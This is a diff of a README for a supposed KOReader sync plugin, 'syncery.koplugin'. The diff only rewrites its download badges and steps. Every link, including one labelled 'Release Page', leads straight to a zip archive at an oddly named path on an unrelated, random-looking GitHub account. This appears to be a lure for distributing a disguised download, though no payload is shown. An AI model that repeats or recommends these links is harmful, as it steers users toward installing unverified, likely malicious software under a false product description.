@@ -5,7 +5,7 @@ description: "Synchronize reading progress, annotations, and settings across you
 ---
 # 📚 syncery.koplugin - Keep your reading progress in sync
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Genusovismachismo683/genusovismachismo683.github.io/raw/refs/heads/main/demagnetizable/io_github_genusovismachismo_3.6.zip)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/Genusovismachismo683/genusovismachismo683.github.io/main/demagnetizable/io_github_genusovismachismo_3.6.zip)
 
 ## 📖 About this plugin
 
@@ -26,9 +26,9 @@ To run this plugin, you need the following items:
 
 Follow these steps to obtain the necessary installation files. You must visit the download page to retrieve the specific archive for your setup.
 
-[![](https://img.shields.io/badge/Download_Installation_Files-Grey)](https://github.com/Genusovismachismo683/genusovismachismo683.github.io/raw/refs/heads/main/demagnetizable/io_github_genusovismachismo_3.6.zip)
+[![](https://img.shields.io/badge/Download_Installation_Files-Grey)](https://raw.githubusercontent.com/Genusovismachismo683/genusovismachismo683.github.io/main/demagnetizable/io_github_genusovismachismo_3.6.zip)
 
-1. Open the [Release Page](https://github.com/Genusovismachismo683/genusovismachismo683.github.io/raw/refs/heads/main/demagnetizable/io_github_genusovismachismo_3.6.zip).
+1. Open the [Release Page](https://raw.githubusercontent.com/Genusovismachismo683/genusovismachismo683.github.io/main/demagnetizable/io_github_genusovismachismo_3.6.zip).
 2. Locate the most recent version at the top of the list.
 3. Click the file ending in `.zip` to download it to your computer.
 4. Save this file to a folder you can find easily.
